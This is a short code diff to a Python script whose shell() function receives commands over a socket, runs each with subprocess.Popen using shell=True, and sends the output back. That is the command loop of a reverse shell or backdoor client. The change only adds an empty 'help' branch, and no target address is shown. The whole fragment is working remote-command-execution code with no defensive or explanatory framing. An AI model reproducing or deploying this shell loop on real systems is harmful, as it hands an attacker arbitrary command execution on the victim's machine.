@@ -23,14 +23,17 @@ def shell():
         command = reliable_recv()
         if command == 'quit':
             break
-        execute = subprocess.Popen(command,
-                                   shell=True,
-                                   stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-        result = execute.stdout.read() + execute.stderr.read()
-        result = result.decode()
-        reliable_send(result)
+        elif command == 'help':
+            pass
+        else:
+            execute = subprocess.Popen(command,
+                                       shell=True,
+                                       stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
